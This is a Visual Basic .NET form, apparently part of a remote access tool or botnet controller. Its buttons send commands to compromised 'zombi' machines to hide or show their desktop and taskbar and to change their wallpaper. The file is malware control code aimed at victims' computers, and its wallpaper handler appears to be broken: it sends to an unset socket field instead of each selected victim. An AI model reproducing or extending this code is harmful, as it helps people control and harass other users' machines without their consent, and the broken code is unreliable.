Imports System
Imports System.IO
Imports System.Windows.Forms
Imports System.Text
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Windows.Forms.MessageBox 'para manter todas as messagebox em superior ou forme na hora de ser exebidas
Imports Microsoft.VisualBasic.CompilerServices

'Coded pjoao1578
'v2
Public Class Fun
#Region "fun"
    Public sock As Integer
    Dim yy As String = "||" 'yy = "||" = senha 
#End Region

    Private Sub Fun_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Try

        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Fun_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try

        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Fun_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Try

        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "descktop+hide")
        Next
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "descktop+show")
        Next
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "barrahide")
        Next
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(x.ToolTipText, "barramostre")
        Next
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        'clea set as wallpaper descktop zombi
        For Each x As ListViewItem In Form1.l1.SelectedItems 'selected zombi = true
            Form1.s.Send(sock, "setaswallpaper" & yy) 'clea set as wallpaper
        Next
    End Sub
End Class